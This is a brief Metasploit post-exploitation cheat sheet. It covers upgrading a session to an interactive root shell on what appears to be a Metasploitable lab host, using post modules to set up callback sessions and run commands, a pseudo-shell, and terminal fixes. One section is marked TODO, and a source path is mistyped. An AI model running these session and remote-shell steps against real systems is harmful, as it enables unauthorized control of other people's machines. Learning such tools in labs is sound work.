# Metasploit

## 01 - Interactive Meta Shell

Make the Meta shell fully interactive. To make full use with other commands such as, `passwd` and `su [username]`.

```
[*] Command shell session 1 opened (10.0.2.4:34869 -> 192.168.56.106:6200 ) at 2022-03-29 03:43:52 -0400

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
root@metasploitable:/# id
id
uid=0(root) gid=0(root)
root@metasploitable:/#
```

## 02 - Post Module

```
msf > use post/multi/manage/system_session

msf post(multi/manage/system_session) > options

msf post(multi/manage/system_session) > set session <session_ID>

msf post(multi/manage/system_session) > set type <auto | ruby | python | perl | bash>

msf post(multi/manage/system_session) > set handler <false | true>

msf post(multi/manage/system_session) > set lhost <IP>

msf post(multi/manage/system_session) > set lport <PORT>

msf post(multi/manage/system_session) > run
```

Pseudo Shell.

```
meterpreter > run post/linux/manage/pseudo_shell
user@debian:/home/user$ ?

Commands Help
==============

        Command             Description
        -------             -----------
        ?                   Show current help
        cat                 Show file contents
        cd                  Change current directory
        clear               Clear screen
        exit                Exit the Pseudo-shell
        groups              Show list of groups
        help                Show current help
        hostname            Show current Hostname
        interfaces          Show list of network interfaces
        ips                 Show list of current IP addresses
        isroot?             Show if current user has root permisions
        ls                  List files and folders in a directory
        macs                Show list of MAC addresses
        path                Show current directories included in $PATH enviroment variable
        pwd                 Show current PATH
        shell               Show current SHELL
        tcp_ports           Show list of listen TCP ports
        udp_ports           Show list of listen UDP ports
        users               Show list of users
        whoami              Show current user

user@debian:/home/user$
```

## 2.10 - Spawn Interactive Shell

TODO: Fill this info

Windows

```
meterpreter > shell
```

Linux

```
meterpreter > shell -t
```

```
msf > use post/multi/manage/open

msf > use post/multi/general/close
```

```
msf > use post/multi/general/execute

msf post(multi/general/execute) > set command <commands>

msf post(multi/general/execute) > run session=<session_ID>
```

## 04 - Troubleshooting

Fix backspace.

```
$ echo 'stty erase ^H' >> ~/.bashrc

$ echo 'stty erase ^H' >> ~/.zshrc
```

Reset resource file.

```
$ source ~./bashrc

$ source ~./zshrc
```